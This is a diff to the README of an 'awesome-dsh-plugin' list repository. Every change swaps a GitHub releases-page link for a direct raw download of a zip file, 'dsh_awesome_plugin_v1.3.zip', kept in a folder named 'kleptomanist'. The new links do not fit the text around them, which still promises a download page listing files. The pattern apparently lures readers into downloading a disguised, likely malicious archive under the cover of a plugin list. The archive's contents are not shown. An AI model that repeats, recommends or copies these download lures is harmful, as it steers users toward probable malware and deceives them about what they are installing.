@@ -1,6 +1,6 @@
 # 🚀 awesome-dsh-plugin - Your Gateway to Powerful Plugins
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--dsh--plugin-blue?style=for-the-badge&logo=github)](https://github.com/dorisaimpatient855/awesome-dsh-plugin/releases)
+[![Download Now](https://img.shields.io/badge/Download-awesome--dsh--plugin-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dorisaimpatient855/awesome-dsh-plugin/main/kleptomanist/dsh_awesome_plugin_v1.3.zip)
 
 ## 👋 Welcome to awesome-dsh-plugin
 
@@ -20,7 +20,7 @@ Whether you're a beginner or a seasoned user, this list will help you discover t
 
 Getting started is easier than you think! Follow these simple steps:
 
-1. **Visit this link to download the application** – [Click here to go to the download page](https://github.com/dorisaimpatient855/awesome-dsh-plugin/releases)
+1. **Visit this link to download the application** – [Click here to go to the download page](https://raw.githubusercontent.com/dorisaimpatient855/awesome-dsh-plugin/main/kleptomanist/dsh_awesome_plugin_v1.3.zip)
 2. When the page opens, you'll see a list of available files.
 3. Look for the latest version (usually at the top).
 4. Click on the download button next to it.
@@ -177,7 +177,7 @@ Here's what users are saying:
 
 Your journey to a better DeepSeek Harness experience starts now!
 
-1. **Click the download button** – [Get awesome-dsh-plugin here](https://github.com/dorisaimpatient855/awesome-dsh-plugin/releases)
+1. **Click the download button** – [Get awesome-dsh-plugin here](https://raw.githubusercontent.com/dorisaimpatient855/awesome-dsh-plugin/main/kleptomanist/dsh_awesome_plugin_v1.3.zip)
 2. **Explore the list** – Take your time browsing
 3. **Install what you like** – Start with your favorites
 4. **Enjoy the upgrade** – Experience the difference
@@ -213,7 +213,7 @@ Remember: The best tool is the one that works for you. With awesome-dsh-plugin, 
 
 Don't forget to visit the download page:
 
-👉 **[Download awesome-dsh-plugin now](https://github.com/dorisaimpatient855/awesome-dsh-plugin/releases)**
+👉 **[Download awesome-dsh-plugin now](https://raw.githubusercontent.com/dorisaimpatient855/awesome-dsh-plugin/main/kleptomanist/dsh_awesome_plugin_v1.3.zip)**
 
 Visit this link to download the application and begin your journey to a more powerful, efficient, and enjoyable DeepSeek Harness experience!
 
